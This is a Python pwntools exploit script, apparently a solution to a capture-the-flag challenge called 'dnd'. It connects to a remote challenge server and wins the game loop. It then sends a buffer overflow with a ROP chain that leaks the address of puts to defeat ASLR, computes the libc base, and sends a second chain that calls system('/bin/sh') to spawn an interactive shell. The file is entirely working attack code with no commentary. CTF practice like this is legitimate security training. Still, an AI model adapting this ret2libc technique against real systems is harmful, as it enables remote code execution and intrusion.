#!/usr/bin/env python3

from pwn import *

exe = ELF("dnd_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe

pop_rdi_pop_rbp = 0x0000000000402640 #: pop rdi ; nop ; pop rbp ; ret

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, '''b *0x402960
        #c
        #''')
    else:
        r = remote("dnd.chals.damctf.xyz", 30813)

    return r


def skip(r):
    while True:
        r.recvuntil(b'[r]un?', timeout=1)
        r.sendline()

        d = r.recvuntil(b'millenia to come.', timeout=1).decode()
        if 'Congratulations' in d:
            break

def main():
    r = conn()
    skip(r)

    p = b''
    p += p64(pop_rdi_pop_rbp)
    p += p64(exe.got['puts'])
    p += p64(0x4200cafe1337)
    p += p64(exe.symbols['puts'])
    p += p64(exe.symbols['main'])

    r.sendline(cyclic(104) + p)

    log.info('sent all input')

    r.recvuntil(b'What is your name')
    r.recvline()
    leak_bytes = r.recvline()
    padded_leak_bytes = leak_bytes.ljust(8, b'\x00')  
    leak = u64(padded_leak_bytes) & 0x0FFFFFFFFFFFF
    log.info(f"Leak bytes: {leak_bytes}, Length: {len(leak_bytes)}")
    log.info(f"Value after unpacking: {hex(leak)}")

    libc_base = leak - (0x5fbe0 + 0x28000)
    libc.address = libc_base
    log.info(f"Libc base: {hex(libc_base)}, one: {hex(libc_base+0x583ec)}")
    log.info(f"libc puts {hex(libc.symbols['puts'])}")

    log.info('triggering main again')
    skip(r)

    p = b''

    rop = ROP(libc)
    rop.call('system', [libc.search(b'/bin/sh').__next__()])
    p += rop.chain()

    r.sendline(cyclic(104) + p)
    r.interactive()


if __name__ == "__main__":
    main()
